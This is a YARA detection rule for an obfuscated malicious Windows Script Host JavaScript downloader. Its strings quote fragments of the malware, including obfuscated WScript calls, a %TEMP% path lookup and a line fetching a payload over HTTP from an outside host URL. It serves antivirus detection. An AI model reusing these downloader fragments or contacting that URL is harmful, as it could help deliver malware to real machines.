rule sig_20160428_b0061a85041d8fbf1fef2bc86282df01 {
  meta:
    description = "datamaliciousorder - file 20160428_b0061a85041d8fbf1fef2bc86282df01.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4f52ddcf1f6e935c5b2dc4b951107089323f52c2c51777b2b7130a770c3085dd"

  strings:
    $s1  = "function MekLahBtnVbiFmvFjnSyz() {return RilNhuGrrQpmMbyOvuSqt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function GazWdxUknQadAxnQcrGnj(EeiGinJkjPkiGbnLeiHox){RilNhuGrrQpmMbyOvuSqt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function GazWdxUknQadAxnQcrGnj(EeiGinJkjPkiGbnLeiHox){RilNhuGrrQpmMbyOvuSqt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function YoaYgpCikLhcBbkDmqGte(VlnOpxKydYsxQeoMwkHhe, PlvCsgMkqEvcLmaIpmSkm){OqjBgfXtyOsqXpuXmzTii = OqjBgfXtyOsqXpuXmzTii * 1; " ascii
    $s5  = "return VlnOpxKydYsxQeoMwkHhe - PlvCsgMkqEvcLmaIpmSkm;};" fullword ascii
    $s6  = "var RilNhuGrrQpmMbyOvuSqt = function SllBmpEbuYxaKqxKllKqy() {return VhmLoxYrwOcdLszGkrLxy[YnkQzfDpqYoyHvlFclKwz](\"WScript\"+\"" ascii
    $s7  = "OlxXdzFnyZcvAzqFswQty[LzfLiaHicNesHtfGwySsq](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var RilNhuGrrQpmMbyOvuSqt = function SllBmpEbuYxaKqxKllKqy() {return VhmLoxYrwOcdLszGkrLxy[YnkQzfDpqYoyHvlFclKwz](\"WScript\"+\"" ascii
    $s9  = "var VhmLoxYrwOcdLszGkrLxy = this[\"WScript\"];" fullword ascii
    $s10 = "function MekLahBtnVbiFmvFjnSyz() {return RilNhuGrrQpmMbyOvuSqt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function UhrEwwMbkZodAbrZviVnq(){return RqcBvoBtkXxoYksHumVah + \"\";};" fullword ascii
    $s12 = "if (OlxXdzFnyZcvAzqFswQty[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function YoaYgpCikLhcBbkDmqGte(VlnOpxKydYsxQeoMwkHhe, PlvCsgMkqEvcLmaIpmSkm){OqjBgfXtyOsqXpuXmzTii = OqjBgfXtyOsqXpuXmzTii * 1; " ascii
    $s14 = "function YrgUepHxuRneEbaCqkStv() {return ((UcqEqrHxbVqoAkxLbuBfi == true) && (UcqEqrHxbVqoAkxLbuBfi == SfhYjzGegOflTwoOmdSsp)) ?" ascii
    $s15 = "function YrgUepHxuRneEbaCqkStv() {return ((UcqEqrHxbVqoAkxLbuBfi == true) && (UcqEqrHxbVqoAkxLbuBfi == SfhYjzGegOflTwoOmdSsp)) ?" ascii
    $s16 = "var XgmVemYrlCehChiQaoPxk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var UcqEqrHxbVqoAkxLbuBfi = false;" fullword ascii
    $s18 = "function CpuSbxMihLemZocZkaKgp(YeoWjzWiyGgeRftYbbYyl) {var JeuKcpXcpZmyBcyAqbHyr = (1, 2, 3, 4, 5, YeoWjzWiyGgeRftYbbYyl); retur" ascii
    $s19 = "UcqEqrHxbVqoAkxLbuBfi = true; " fullword ascii
    $s20 = "return YoaYgpCikLhcBbkDmqGte(1 == 1 ? HaoXxyLxuXwgFocDncMgc : 0, 1 == 1 ? MfsIstQznOudLjmTnkOfh : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}